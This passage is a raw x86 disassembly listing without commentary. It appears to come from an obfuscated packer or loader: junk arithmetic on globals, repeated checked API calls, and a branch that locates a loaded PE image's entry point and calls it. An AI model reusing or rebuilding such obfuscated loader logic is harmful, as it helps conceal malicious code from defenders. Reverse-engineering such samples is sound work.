  423eba:	or     DWORD PTR ds:0x42a2fa,0x3e60
  423ec4:	imul   eax,eax,0x300000
  423eca:	mov    DWORD PTR ds:0x42a2ae,0x6f02
  423ed4:	cmp    eax,0x1b00000
  423ed9:	mov    DWORD PTR ds:0x42a256,0x6c6e
  423ee3:	jne    0x423a2f
  423ee9:	or     DWORD PTR ds:0x42a2ea,0x2c5c
  423ef3:	lea    eax,[esp+0x1b8]
  423efa:	push   eax
  423efb:	push   0x429676
  423f00:	add    DWORD PTR ds:0x42a2de,0x42a26e
  423f0a:	call   DWORD PTR ds:0x42a3e6
  423f10:	mov    DWORD PTR ds:0x42a27e,0xb7
  423f1a:	cmp    eax,0xffffffff
  423f1d:	mov    DWORD PTR ds:0x42a29a,0x2154
  423f27:	jne    0x423a2f
  423f2d:	xor    DWORD PTR ds:0x42a2ae,0x154c
  423f37:	mov    eax,DWORD PTR [esp+0xc]
  423f3b:	mov    DWORD PTR ds:0x42a26e,0x11
  423f45:	cmp    DWORD PTR ds:0x42a26e,0x0
  423f4c:	je     0x423f97
  423f52:	cmp    DWORD PTR ds:0x42a26e,0x12
  423f59:	jge    0x423f97
  423f5f:	jmp    0x423f85
  423f64:	push   DWORD PTR [ebp-0x28]
  423f67:	push   DWORD PTR [ebp-0x24]
  423f6a:	push   DWORD PTR [ebp-0x24]
  423f6d:	push   0x7e73
  423f72:	push   DWORD PTR [ebp-0x18]
  423f75:	push   0x85b3
  423f7a:	push   0x429247
  423f7f:	call   DWORD PTR ds:0x42a3d6
  423f85:	mov    ecx,DWORD PTR ds:0x42a26e
  423f8b:	dec    ecx
  423f8c:	mov    DWORD PTR ds:0x42a26e,ecx
  423f92:	jmp    0x423f45
  423f97:	mov    ecx,DWORD PTR [esp+0x10]
  423f9b:	adc    DWORD PTR ds:0x42a2ae,0x42a2d2
  423fa5:	xor    eax,edi
  423fa7:	lea    eax,[eax+ecx*1+0x3272f1]
  423fae:	push   eax
  423faf:	and    DWORD PTR ds:0x42a2ea,0x0
  423fb9:	mov    eax,ds:0x42a2ea
  423fbe:	inc    eax
  423fbf:	mov    ds:0x42a2ea,eax
  423fc4:	cmp    DWORD PTR ds:0x42a2ea,0x26
  423fcb:	jbe    0x423fe9
  423fd1:	jmp    0x423fdc
  423fd6:	call   DWORD PTR ds:0x42a3da
  423fdc:	cmp    DWORD PTR ds:0x42a2ea,0x1a
  423fe3:	jb     0x423fb9
  423fe9:	mov    eax,DWORD PTR [esp+0x1c]
  423fed:	sbb    DWORD PTR ds:0x42a2aa,0x42a2be
  423ff7:	xor    eax,edi
  423ff9:	lea    eax,[ebp+eax*1+0x3272f9]
  424000:	push   eax
  424001:	mov    eax,ds:0x42941e
  424006:	push   DWORD PTR [eax+0x1bc]
  42400c:	sub    DWORD PTR ds:0x42a2ea,0x42a286
  424016:	call   0x424c9b
  42401b:	mov    eax,DWORD PTR [esp+0xc]
  42401f:	mov    ecx,DWORD PTR [esp+0x10]
  424023:	and    DWORD PTR ds:0x42a2aa,0x0
  42402d:	mov    edx,DWORD PTR ds:0x42a2aa
  424033:	inc    edx
  424034:	mov    DWORD PTR ds:0x42a2aa,edx
  42403a:	cmp    DWORD PTR ds:0x42a2aa,0x9
  424041:	jg     0x42408b
  424047:	jmp    0x424062
  42404c:	push   DWORD PTR [ebp-0x10]
  42404f:	push   0x1529
  424054:	push   DWORD PTR [ebp-0x28]
  424057:	push   0x155a
  42405c:	call   DWORD PTR ds:0x42a3de
  424062:	cmp    DWORD PTR ds:0x42a2aa,0x8
  424069:	jne    0x42407e
  42406f:	xor    edx,edx
  424071:	or     edx,DWORD PTR ds:0x42a2aa
  424077:	inc    edx
  424078:	mov    DWORD PTR ds:0x42a2aa,edx
  42407e:	cmp    DWORD PTR ds:0x42a2aa,0x1e
  424085:	jb     0x42402d
  42408b:	xor    eax,edi
  42408d:	adc    DWORD PTR ds:0x42a256,ebx
  424093:	lea    eax,[ecx+eax*1+0x3272f1]
  42409a:	movzx  ecx,WORD PTR ds:0x42a2a6
  4240a1:	xor    DWORD PTR ds:0x42a29e,ecx
  4240a7:	mov    ecx,DWORD PTR [esp+0xc]
  4240ab:	mov    edx,DWORD PTR [esp+0xc]
  4240af:	adc    DWORD PTR ds:0x42a2b6,0x42a2ee
  4240b9:	xor    edx,edi
  4240bb:	xor    ecx,edi
  4240bd:	add    ecx,edx
  4240bf:	mov    edx,DWORD PTR [esp+0xc]
  4240c3:	xor    edx,edi
  4240c5:	lea    ecx,[ecx+edx*1+0x9758d3]
  4240cc:	mov    DWORD PTR ds:0x42a2ea,0x175a
  4240d6:	mov    DWORD PTR [esp+0x10],eax
  4240da:	mov    DWORD PTR ds:0x42a28e,0x2b18
  4240e4:	cmp    eax,ecx
  4240e6:	jbe    0x423e5b
  4240ec:	or     ecx,DWORD PTR ds:0x42a286
  4240f2:	mov    eax,DWORD PTR [ebp+0xc]
  4240f5:	mov    ds:0x4292a2,eax
  4240fa:	mov    eax,DWORD PTR [ebp+0x10]
  4240fd:	and    DWORD PTR ds:0x42a2c2,0x0
  424107:	jmp    0x42411b
  42410c:	xor    ecx,ecx
  42410e:	xor    ecx,DWORD PTR ds:0x42a2c2
  424114:	inc    ecx
  424115:	mov    DWORD PTR ds:0x42a2c2,ecx
  42411b:	cmp    DWORD PTR ds:0x42a2c2,0x1b
  424122:	jae    0x424145
  424128:	cmp    DWORD PTR ds:0x42a2c2,0x29
  42412f:	jle    0x424145
  424135:	jmp    0x424140
  42413a:	call   DWORD PTR ds:0x42a3e2
  424140:	jmp    0x42410c
  424145:	mov    ds:0x4294fe,eax
  42414a:	xor    ecx,eax
  42414c:	mov    eax,ds:0x4292a2
  424151:	and    ecx,0x3395
  424157:	mov    ecx,DWORD PTR [esp+0x30]
  42415b:	add    DWORD PTR ds:0x42a2c2,0x886
  424165:	sub    eax,ebx
  424167:	adc    DWORD PTR ds:0x42a2c2,0x4089
  424171:	xor    eax,edi
  424173:	sub    DWORD PTR ds:0x42a2b6,0x2768
  42417d:	mov    DWORD PTR [ecx],eax
  42417f:	and    DWORD PTR ds:0x42a2aa,0x51d9
  424189:	lea    eax,[esp+0x2c]
  42418d:	mov    DWORD PTR [esp+0x6c],eax
  424191:	lea    eax,[ebp+0x4]
  424194:	mov    DWORD PTR [esp+0x2c],eax
  424198:	xor    DWORD PTR ds:0x42a2da,0x6aa
  4241a2:	lea    eax,[esp+0x78]
  4241a6:	sub    DWORD PTR ds:0x42a266,0x42a2ba
  4241b0:	push   eax
  4241b1:	push   0x429662
  4241b6:	sub    DWORD PTR ds:0x42a25e,0x6538
  4241c0:	call   DWORD PTR ds:0x42a3c6
  4241c6:	mov    DWORD PTR ds:0x42a2aa,0x7d87
  4241d0:	cmp    eax,0xffffffff
  4241d3:	jne    0x423a2f
  4241d9:	push   0xf
  4241db:	lea    eax,[esp+0x44]
  4241df:	push   eax
  4241e0:	and    DWORD PTR ds:0x42a302,0x42a2e2
  4241ea:	push   0x4296b6
  4241ef:	sub    DWORD PTR ds:0x42a2d2,0x1a40
  4241f9:	push   0x4296ca
  4241fe:	adc    DWORD PTR ds:0x42a302,0xcfc
  424208:	push   0x4296ea
  42420d:	add    DWORD PTR ds:0x42a292,0x42a286
  424217:	call   esi
  424219:	xor    DWORD PTR ds:0x42a2aa,0x42a302
  424223:	imul   eax,eax,0x300000
  424229:	cmp    eax,0x1b00000
  42422e:	mov    DWORD PTR ds:0x42a2d6,0x3d32
  424238:	jne    0x423a2f
  42423e:	lea    eax,[esp+0x1b8]
  424245:	adc    DWORD PTR ds:0x42a29a,0x42a2c6
  42424f:	push   eax
  424250:	and    DWORD PTR ds:0x42a2ea,0x7bce
  42425a:	push   0x429726
  42425f:	xor    DWORD PTR ds:0x42a2d2,0x75c
  424269:	call   DWORD PTR ds:0x42a3e6
  42426f:	cmp    eax,0xffffffff
  424272:	mov    DWORD PTR ds:0x42a2d6,0x39fb
  42427c:	jne    0x423a2f
  424282:	sbb    DWORD PTR ds:0x42a2ea,0x7658
  42428c:	lea    eax,[esp+0x78]
  424290:	push   eax
  424291:	push   0x429712
  424296:	call   DWORD PTR ds:0x42a3c6
  42429c:	cmp    eax,0xffffffff
  42429f:	mov    DWORD PTR ds:0x42a27a,0x74cc
  4242a9:	jne    0x423a2f
  4242af:	adc    DWORD PTR ds:0x42a2be,0x42a2e2
  4242b9:	push   0xf
  4242bb:	and    DWORD PTR ds:0x42a272,0x42a2d6
  4242c5:	lea    eax,[esp+0x44]
  4242c9:	xor    DWORD PTR ds:0x42a2da,0x20f3
  4242d3:	push   eax
  4242d4:	sub    DWORD PTR ds:0x42a2f2,0x57ed
  4242de:	push   0x429766
  4242e3:	push   0x42977a
  4242e8:	push   0x42979a
  4242ed:	sbb    DWORD PTR ds:0x42a272,0x42a302
  4242f7:	call   esi
  4242f9:	imul   eax,eax,0x300000
  4242ff:	cmp    eax,0x1b00000
  424304:	mov    DWORD PTR ds:0x42a2ea,0x7ab0
  42430e:	jne    0x423a2f
  424314:	and    DWORD PTR ds:0x42a2e6,0x42a29a
  42431e:	lea    eax,[esp+0x1b8]
  424325:	neg    DWORD PTR ds:0x42a26e
  42432b:	push   eax
  42432c:	push   0x4297d6
  424331:	xor    DWORD PTR ds:0x42a28e,0x42a2c2
  42433b:	call   DWORD PTR ds:0x42a3e6
  424341:	mov    DWORD PTR ds:0x42a292,0x73e5
  42434b:	cmp    eax,0xffffffff
  42434e:	jne    0x423a2f
  424354:	lea    eax,[esp+0x78]
  424358:	xor    DWORD PTR ds:0x42a2ea,0x42a256
  424362:	push   eax
  424363:	and    DWORD PTR ds:0x42a28e,0x42a256
  42436d:	push   0x4297c2
  424372:	sub    DWORD PTR ds:0x42a26e,0xb4e
  42437c:	call   DWORD PTR ds:0x42a3c6
  424382:	mov    DWORD PTR ds:0x42a292,0x325f
  42438c:	cmp    eax,0xffffffff
  42438f:	mov    DWORD PTR ds:0x42a2d2,0x412a
  424399:	jne    0x423a2f
  42439f:	adc    DWORD PTR ds:0x42a28a,0x42a27a
  4243a9:	push   0xf
  4243ab:	lea    eax,[esp+0x44]
  4243af:	push   eax
  4243b0:	adc    DWORD PTR ds:0x42a28a,0x1e7a
  4243ba:	push   0x429816
  4243bf:	sub    DWORD PTR ds:0x42a2aa,0xfe
  4243c9:	push   0x42982a
  4243ce:	sub    DWORD PTR ds:0x42a27e,0x1b5
  4243d8:	push   0x42984a
  4243dd:	adc    DWORD PTR ds:0x42a28e,0x2d72
  4243e7:	call   esi
  4243e9:	imul   eax,eax,0x300000
  4243ef:	cmp    eax,0x1b00000
  4243f4:	mov    DWORD PTR ds:0x42a28e,0x482a
  4243fe:	jne    0x423a2f
  424404:	sub    DWORD PTR ds:0x42a25a,0x42a2ba
  42440e:	lea    eax,[esp+0x1b8]
  424415:	push   eax
  424416:	adc    DWORD PTR ds:0x42a28e,0x42a2da
  424420:	push   0x429886
  424425:	xor    DWORD PTR ds:0x42a26e,0x42a29a
  42442f:	call   DWORD PTR ds:0x42a3e6
  424435:	mov    DWORD PTR ds:0x42a2ca,0x1025
  42443f:	cmp    eax,0xffffffff
  424442:	jne    0x423a2f
  424448:	xor    DWORD PTR ds:0x42a2c2,0x449b
  424452:	lea    eax,[esp+0x78]
  424456:	push   eax
  424457:	push   0x429872
  42445c:	and    DWORD PTR ds:0x42a27a,0x42a2fa
  424466:	call   DWORD PTR ds:0x42a3c6
  42446c:	mov    DWORD PTR ds:0x42a2fa,0x2004
  424476:	cmp    eax,0xffffffff
  424479:	mov    DWORD PTR ds:0x42a296,0x62c6
  424483:	jne    0x423a2f
  424489:	and    DWORD PTR ds:0x42a2de,0x5eb4
  424493:	push   0xf
  424495:	adc    DWORD PTR ds:0x42a28a,0x4918
  42449f:	lea    eax,[esp+0x44]
  4244a3:	or     DWORD PTR ds:0x42a2a6,0x42a25e
  4244ad:	push   eax
  4244ae:	sbb    DWORD PTR ds:0x42a2a2,0x42a262
  4244b8:	push   0x4298c6
  4244bd:	xor    DWORD PTR ds:0x42a2d2,0x1d8b
  4244c7:	push   0x4298da
  4244cc:	and    DWORD PTR ds:0x42a2b6,0x42a302
  4244d6:	push   0x4298fa
  4244db:	not    DWORD PTR ds:0x42a2d2
  4244e1:	call   esi
  4244e3:	imul   eax,eax,0x300000
  4244e9:	cmp    eax,0x1b00000
  4244ee:	mov    DWORD PTR ds:0x42a292,0xbee
  4244f8:	jne    0x423a2f
  4244fe:	xor    DWORD PTR ds:0x42a266,0x42a2c6
  424508:	lea    eax,[esp+0x1b8]
  42450f:	push   eax
  424510:	or     DWORD PTR ds:0x42a2be,0x2cef
  42451a:	push   0x429936
  42451f:	call   DWORD PTR ds:0x42a3e6
  424525:	cmp    eax,0xffffffff
  424528:	mov    DWORD PTR ds:0x42a2b6,0x6b51
  424532:	jne    0x423a2f
  424538:	sub    DWORD PTR ds:0x42a276,0x363f
  424542:	lea    eax,[esp+0x78]
  424546:	add    DWORD PTR ds:0x42a29e,0x42a302
  424550:	push   eax
  424551:	push   0x429922
  424556:	adc    DWORD PTR ds:0x42a27a,0x42a2c6
  424560:	call   DWORD PTR ds:0x42a3c6
  424566:	cmp    eax,0xffffffff
  424569:	jne    0x423a2f
  42456f:	or     DWORD PTR ds:0x42a292,0x4d8b
  424579:	push   0xf
  42457b:	or     DWORD PTR ds:0x42a2c6,0x42a2d2
  424585:	lea    eax,[esp+0x44]
  424589:	push   eax
  42458a:	adc    DWORD PTR ds:0x42a2a6,0x7f91
  424594:	push   0x429976
  424599:	and    DWORD PTR ds:0x42a28e,0x42a27e
  4245a3:	push   0x42998a
  4245a8:	push   0x4299aa
  4245ad:	call   esi
  4245af:	or     DWORD PTR ds:0x42a2d6,0x5541
  4245b9:	imul   eax,eax,0x300000
  4245bf:	mov    DWORD PTR ds:0x42a292,0x284d
  4245c9:	cmp    eax,0x1b00000
  4245ce:	mov    DWORD PTR ds:0x42a302,0x32eb
  4245d8:	jne    0x423a2f
  4245de:	adc    DWORD PTR ds:0x42a2ee,0x651e
  4245e8:	lea    eax,[esp+0x1b8]
  4245ef:	push   eax
  4245f0:	and    DWORD PTR ds:0x42a286,0x42a2f2
  4245fa:	push   0x4299e6
  4245ff:	sub    DWORD PTR ds:0x42a2ee,0x3d63
  424609:	call   DWORD PTR ds:0x42a3e6
  42460f:	mov    DWORD PTR ds:0x42a2a2,0x1646
  424619:	cmp    eax,0xffffffff
  42461c:	jne    0x423a2f
  424622:	adc    DWORD PTR ds:0x42a286,0x29d1
  42462c:	lea    eax,[esp+0x78]
  424630:	push   eax
  424631:	sbb    DWORD PTR ds:0x42a25a,0x42a26e
  42463b:	push   0x4299d2
  424640:	adc    DWORD PTR ds:0x42a28a,0x42a2ae
  42464a:	call   DWORD PTR ds:0x42a3c6
  424650:	cmp    eax,0xffffffff
  424653:	jne    0x423a2f
  424659:	push   0xf
  42465b:	mov    DWORD PTR ds:0x42a2da,0x5dc8
  424665:	lea    eax,[esp+0x44]
  424669:	add    DWORD PTR ds:0x42a2a6,0x42a2b6
  424673:	push   eax
  424674:	not    DWORD PTR ds:0x42a25e
  42467a:	push   0x429a26
  42467f:	push   0x429a3a
  424684:	or     DWORD PTR ds:0x42a26a,0x42a25e
  42468e:	push   0x429a5a
  424693:	call   esi
  424695:	imul   eax,eax,0x300000
  42469b:	cmp    eax,0x1b00000
  4246a0:	jne    0x423a2f
  4246a6:	lea    eax,[esp+0x1b8]
  4246ad:	push   eax
  4246ae:	push   0x429a96
  4246b3:	xor    DWORD PTR ds:0x42a286,0x22c0
  4246bd:	call   DWORD PTR ds:0x42a3e6
  4246c3:	cmp    eax,0xffffffff
  4246c6:	jne    0x423a2f
  4246cc:	xor    DWORD PTR ds:0x42a2d6,0x42a2f2
  4246d6:	lea    eax,[esp+0x78]
  4246da:	and    DWORD PTR ds:0x42a272,0x42a2da
  4246e4:	push   eax
  4246e5:	push   0x429a82
  4246ea:	dec    DWORD PTR ds:0x42a2ae
  4246f0:	call   DWORD PTR ds:0x42a3c6
  4246f6:	mov    DWORD PTR ds:0x42a296,0x5803
  424700:	cmp    eax,0xffffffff
  424703:	mov    DWORD PTR ds:0x42a2ee,0x7cea
  42470d:	jne    0x423a2f
  424713:	xor    DWORD PTR ds:0x42a2c6,0x69dc
  42471d:	push   0xf
  42471f:	add    DWORD PTR ds:0x42a302,0x59e7
  424729:	lea    eax,[esp+0x44]
  42472d:	push   eax
  42472e:	push   0x429ad6
  424733:	and    DWORD PTR ds:0x42a2fa,0x200e
  42473d:	push   0x429aea
  424742:	push   0x429b0a
  424747:	call   esi
  424749:	imul   eax,eax,0x300000
  42474f:	cmp    eax,0x1b00000
  424754:	mov    DWORD PTR ds:0x42a29e,0x5c25
  42475e:	jne    0x423a2f
  424764:	sbb    DWORD PTR ds:0x42a2ce,0x42a2d6
  42476e:	lea    eax,[esp+0x1b8]
  424775:	xor    DWORD PTR ds:0x42a2a2,0x42a2aa
  42477f:	push   eax
  424780:	push   0x429b46
  424785:	or     DWORD PTR ds:0x42a266,0x3d87
  42478f:	call   DWORD PTR ds:0x42a3e6
  424795:	mov    DWORD PTR ds:0x42a2ca,0x3132
  42479f:	cmp    eax,0xffffffff
  4247a2:	jne    0x423a2f
  4247a8:	lea    eax,[esp+0x78]
  4247ac:	push   eax
  4247ad:	push   0x429b32
  4247b2:	call   DWORD PTR ds:0x42a3c6
  4247b8:	cmp    eax,0xffffffff
  4247bb:	jne    0x423a2f
  4247c1:	push   0xf
  4247c3:	lea    eax,[esp+0x44]
  4247c7:	push   eax
  4247c8:	push   0x429b86
  4247cd:	push   0x429b9a
  4247d2:	push   0x429bba
  4247d7:	call   esi
  4247d9:	imul   eax,eax,0x300000
  4247df:	cmp    eax,0x1b00000
  4247e4:	jne    0x423a2f
  4247ea:	lea    eax,[esp+0x1b8]
  4247f1:	push   eax
  4247f2:	push   0x429bf6
  4247f7:	call   DWORD PTR ds:0x42a3e6
  4247fd:	cmp    eax,0xffffffff
  424800:	jne    0x423a2f
  424806:	lea    eax,[esp+0x78]
  42480a:	push   eax
  42480b:	push   0x429be2
  424810:	call   DWORD PTR ds:0x42a3c6
  424816:	cmp    eax,0xffffffff
  424819:	jne    0x423a2f
  42481f:	push   0xf
  424821:	lea    eax,[esp+0x44]
  424825:	push   eax
  424826:	push   0x429c36
  42482b:	push   0x429c4a
  424830:	push   0x429c6a
  424835:	call   esi
  424837:	imul   eax,eax,0x300000
  42483d:	cmp    eax,0x1b00000
  424842:	jne    0x423a2f
  424848:	lea    eax,[esp+0x1b8]
  42484f:	push   eax
  424850:	push   0x429ca6
  424855:	call   DWORD PTR ds:0x42a3e6
  42485b:	cmp    eax,0xffffffff
  42485e:	jne    0x423a2f
  424864:	lea    eax,[esp+0x78]
  424868:	push   eax
  424869:	push   0x429c92
  42486e:	call   DWORD PTR ds:0x42a3c6
  424874:	cmp    eax,0xffffffff
  424877:	jne    0x423a2f
  42487d:	push   0xf
  42487f:	lea    eax,[esp+0x44]
  424883:	push   eax
  424884:	push   0x429ce6
  424889:	push   0x429cfa
  42488e:	push   0x429d1a
  424893:	call   esi
  424895:	imul   eax,eax,0x300000
  42489b:	cmp    eax,0x1b00000
  4248a0:	jne    0x423a2f
  4248a6:	lea    eax,[esp+0x1b8]
  4248ad:	push   eax
  4248ae:	push   0x429d56
  4248b3:	call   DWORD PTR ds:0x42a3e6
  4248b9:	cmp    eax,0xffffffff
  4248bc:	jne    0x423a2f
  4248c2:	lea    eax,[esp+0x78]
  4248c6:	push   eax
  4248c7:	push   0x429d42
  4248cc:	call   DWORD PTR ds:0x42a3c6
  4248d2:	cmp    eax,0xffffffff
  4248d5:	jne    0x423a2f
  4248db:	push   0xf
  4248dd:	lea    eax,[esp+0x44]
  4248e1:	push   eax
  4248e2:	push   0x429d96
  4248e7:	push   0x429daa
  4248ec:	push   0x429dca
  4248f1:	call   esi
  4248f3:	imul   eax,eax,0x300000
  4248f9:	cmp    eax,0x1b00000
  4248fe:	jne    0x423a2f
  424904:	lea    eax,[esp+0x1b8]
  42490b:	push   eax
  42490c:	push   0x429e06
  424911:	call   DWORD PTR ds:0x42a3e6
  424917:	cmp    eax,0xffffffff
  42491a:	jne    0x423a2f
  424920:	lea    eax,[esp+0x78]
  424924:	push   eax
  424925:	push   0x429df2
  42492a:	call   DWORD PTR ds:0x42a3c6
  424930:	cmp    eax,0xffffffff
  424933:	jne    0x423a2f
  424939:	push   0xf
  42493b:	lea    eax,[esp+0x44]
  42493f:	push   eax
  424940:	push   0x429e46
  424945:	push   0x429e5a
  42494a:	push   0x429e7a
  42494f:	call   esi
  424951:	imul   eax,eax,0x300000
  424957:	cmp    eax,0x1b00000
  42495c:	jne    0x423a2f
  424962:	lea    eax,[esp+0x1b8]
  424969:	push   eax
  42496a:	push   0x429eb6
  42496f:	call   DWORD PTR ds:0x42a3e6
  424975:	cmp    eax,0xffffffff
  424978:	jne    0x423a2f
  42497e:	mov    eax,DWORD PTR [esp+0x3c]
  424982:	cmp    eax,0xf89c85ba
  424987:	je     0x4249e6
  42498d:	mov    eax,DWORD PTR [esp+0x20]
  424991:	mov    ecx,DWORD PTR [esp+0x38]
  424995:	xor    eax,edi
  424997:	add    eax,ebx
  424999:	cmp    eax,ecx
  42499b:	je     0x4249e6
  4249a1:	mov    eax,ds:0x42941e
  4249a6:	mov    eax,DWORD PTR [eax+0x194]
  4249ac:	mov    ecx,DWORD PTR [eax]
  4249ae:	mov    eax,DWORD PTR [ecx+0x3c]
  4249b1:	push   DWORD PTR ds:0x4294fe
  4249b7:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4249bb:	push   DWORD PTR ds:0x4292a2
  4249c1:	add    eax,ecx
  4249c3:	mov    ecx,DWORD PTR ds:0x42941e
  4249c9:	mov    ecx,DWORD PTR [ecx+0x194]
  4249cf:	push   DWORD PTR [ecx]
  4249d1:	call   eax
  4249d3:	mov    ecx,DWORD PTR ds:0x42941e
  4249d9:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4249df:	mov    DWORD PTR [ecx],eax
  4249e1:	jmp    0x424c13
  4249e6:	mov    eax,DWORD PTR [esp+0x20]
  4249ea:	mov    ecx,DWORD PTR [esp+0x60]
  4249ee:	xor    eax,edi
  4249f0:	add    eax,ebx
  4249f2:	cmp    eax,ecx
  4249f4:	jne    0x424a5d
  4249fa:	mov    eax,DWORD PTR [esp+0x20]
  4249fe:	mov    ecx,DWORD PTR ds:0x42941e
  424a04:	mov    ecx,DWORD PTR [ecx+0x198]
  424a0a:	xor    eax,edi
  424a0c:	add    eax,ebx
  424a0e:	cmp    eax,DWORD PTR [ecx]
  424a10:	jne    0x424a36
  424a16:	mov    eax,DWORD PTR [esp+0x20]
  424a1a:	push   0xf89c85a5
  424a1f:	xor    eax,edi
  424a21:	add    eax,ebx
  424a23:	push   eax
  424a24:	push   0xf89c85b9
  424a29:	push   DWORD PTR [esp+0x18]
  424a2d:	push   DWORD PTR [esp+0x30]
  424a31:	call   0x423317
  424a36:	push   DWORD PTR [esp+0xc]
  424a3a:	push   DWORD PTR [esp+0x24]
  424a3e:	call   0x401000
  424a43:	mov    eax,DWORD PTR [esp+0x20]
  424a47:	xor    eax,edi
  424a49:	add    eax,ebx
  424a4b:	mov    ds:0x4294aa,eax
  424a50:	mov    eax,DWORD PTR [esp+0x20]
  424a54:	xor    eax,edi
  424a56:	add    eax,ebx
  424a58:	mov    ds:0x4294a2,eax
  424a5d:	mov    eax,DWORD PTR [esp+0x2c]
  424a61:	test   eax,eax
  424a63:	je     0x424c13
  424a69:	lea    eax,[esp+0x78]
  424a6d:	mov    DWORD PTR [esp+0x64],0xf152c32
  424a75:	push   eax
  424a76:	mov    DWORD PTR [esp+0x78],0x712ed2f
  424a7e:	mov    DWORD PTR [esp+0x74],0x373fc0d
  424a86:	push   0x429ea2
  424a8b:	mov    DWORD PTR [esp+0x70],0x72670add
  424a93:	call   DWORD PTR ds:0x42a3c6
  424a99:	cmp    eax,0xffffffff
  424a9c:	jne    0x423a2f
  424aa2:	push   0xf
  424aa4:	lea    eax,[esp+0x44]
  424aa8:	push   eax
  424aa9:	push   0x429ef6
  424aae:	push   0x429f0a
  424ab3:	push   0x429f2a
  424ab8:	call   esi
  424aba:	imul   eax,eax,0x300000
  424ac0:	cmp    eax,0x1b00000
  424ac5:	jne    0x423a2f
  424acb:	lea    eax,[esp+0x1b8]
  424ad2:	push   eax
  424ad3:	push   0x429f66
  424ad8:	call   DWORD PTR ds:0x42a3e6
  424ade:	cmp    eax,0xffffffff
  424ae1:	jne    0x423a2f
  424ae7:	call   0x422f9c
  424aec:	mov    eax,DWORD PTR [esp+0x34]
  424af0:	mov    eax,DWORD PTR [esp+0xc]
  424af4:	mov    DWORD PTR [esp+0x30],eax
  424af8:	mov    eax,DWORD PTR [esp+0x20]
  424afc:	mov    DWORD PTR [esp+0xc],eax
  424b00:	mov    eax,eax
  424b02:	mov    eax,ds:0x42941e
  424b07:	mov    ecx,DWORD PTR [eax+0x1c0]
  424b0d:	mov    edx,DWORD PTR [ecx]
  424b0f:	and    DWORD PTR [esp+0x1c],0x0
  424b14:	mov    esi,0xfabdbed8
  424b19:	add    edx,esi
  424b1b:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424b20:	mov    ecx,0x8a29a13d
  424b25:	xor    edx,ecx
  424b27:	mov    DWORD PTR [esp+0x10],edx
  424b2b:	mov    edx,DWORD PTR [esp+0x1c]
  424b2f:	xor    edx,0x0
  424b32:	cmp    DWORD PTR [esp+0x10],0x70941fe4
  424b3a:	mov    DWORD PTR [esp+0x14],edx
  424b3e:	jne    0x424b4d
  424b44:	cmp    edx,0xffffffff
  424b47:	je     0x424bb6
  424b4d:	mov    eax,DWORD PTR [eax+0x1c8]
  424b53:	mov    eax,DWORD PTR [eax]
  424b55:	cdq    
  424b56:	add    eax,esi
  424b58:	adc    edx,0xffffffff
  424b5b:	and    DWORD PTR [esp+0x1c],0x0
  424b60:	xor    edx,0x0
  424b63:	mov    DWORD PTR [esp+0x24],edx
  424b67:	mov    edx,DWORD PTR [esp+0xc]
  424b6b:	mov    DWORD PTR [esp+0x18],edx
  424b6f:	xor    eax,ecx
  424b71:	add    DWORD PTR [esp+0x18],esi
  424b75:	mov    edx,DWORD PTR [esp+0x18]
  424b79:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424b7e:	xor    edx,ecx
  424b80:	mov    DWORD PTR [esp+0x10],edx
  424b84:	mov    edx,DWORD PTR [esp+0x1c]
  424b88:	xor    edx,0x0
  424b8b:	mov    DWORD PTR [esp+0x14],edx
  424b8f:	cmp    DWORD PTR [esp+0x10],eax
  424b93:	jne    0x424ba5
  424b99:	mov    eax,DWORD PTR [esp+0x24]
  424b9d:	cmp    edx,eax
  424b9f:	je     0x424bb6
  424ba5:	mov    eax,DWORD PTR [esp+0xc]
  424ba9:	add    eax,DWORD PTR [esp+0x30]
  424bad:	mov    DWORD PTR [esp+0xc],eax
  424bb1:	jmp    0x424c13
  424bb6:	mov    eax,ds:0x4294a2
  424bbb:	mov    edx,DWORD PTR ds:0x4294aa
  424bc1:	xor    eax,edx
  424bc3:	mov    ds:0x4294a2,eax
  424bc8:	mov    edx,DWORD PTR ds:0x4294a2
  424bce:	mov    eax,DWORD PTR [esp+0x2c]
  424bd2:	add    DWORD PTR [eax],edx
  424bd4:	mov    edx,DWORD PTR [esp+0xc]
  424bd8:	mov    eax,ds:0x4294a2
  424bdd:	xor    edx,edi
  424bdf:	add    edx,ebx
  424be1:	xor    ebx,ebx
  424be3:	add    edx,esi
  424be5:	adc    ebx,0xffffffff
  424be8:	xor    edi,edi
  424bea:	xor    edx,ecx
  424bec:	xor    ebx,0x0
  424bef:	add    eax,esi
  424bf1:	adc    edi,0xffffffff
  424bf4:	xor    eax,ecx
  424bf6:	xor    edi,0x0
  424bf9:	cmp    eax,edx
  424bfb:	jne    0x424c13
  424c01:	cmp    edi,ebx
  424c03:	jne    0x424c13
  424c09:	mov    eax,ds:0x4294a2
  424c0e:	mov    ds:0x4294aa,eax
  424c13:	lea    eax,[esp+0x78]
  424c17:	push   eax
  424c18:	push   0x429f52
  424c1d:	call   DWORD PTR ds:0x42a3c6
  424c23:	cmp    eax,0xffffffff
  424c26:	jne    0x423a2f
  424c2c:	push   0xf
  424c2e:	lea    eax,[esp+0x44]
  424c32:	push   eax
  424c33:	push   0x429fa6
  424c38:	push   0x429fba
  424c3d:	push   0x429fda
  424c42:	call   DWORD PTR ds:0x42a3fe
  424c48:	imul   eax,eax,0x300000
  424c4e:	cmp    eax,0x1b00000
  424c53:	jne    0x423a2f
  424c59:	lea    eax,[esp+0x1b8]
  424c60:	push   eax
  424c61:	push   0x42a006
  424c66:	call   DWORD PTR ds:0x42a3e6
  424c6c:	cmp    eax,0xffffffff
  424c6f:	jne    0x423a2f
  424c75:	mov    eax,ds:0x42941e
  424c7a:	push   0x4
  424c7c:	add    eax,0x1cc
  424c81:	push   eax
  424c82:	lea    eax,[esp+0x3c]
  424c86:	push   eax
  424c87:	call   0x424c9b
  424c8c:	mov    eax,DWORD PTR [esp+0x34]
  424c90:	mov    eax,DWORD PTR [eax]
  424c92:	pop    edi
  424c93:	pop    esi
  424c94:	pop    ebx
  424c95:	mov    esp,ebp
  424c97:	pop    ebp
  424c98:	ret    0xc
  424c9b:	push   ebp
  424c9c:	mov    ebp,esp
  424c9e:	sub    esp,0x10
  424ca1:	and    DWORD PTR ds:0x42a2ea,0x0
  424cab:	mov    ecx,DWORD PTR ds:0x42a2ea
  424cb1:	inc    ecx
  424cb2:	mov    DWORD PTR ds:0x42a2ea,ecx
  424cb8:	cmp    DWORD PTR ds:0x42a2ea,0x8
  424cbf:	jg     0x424d0b
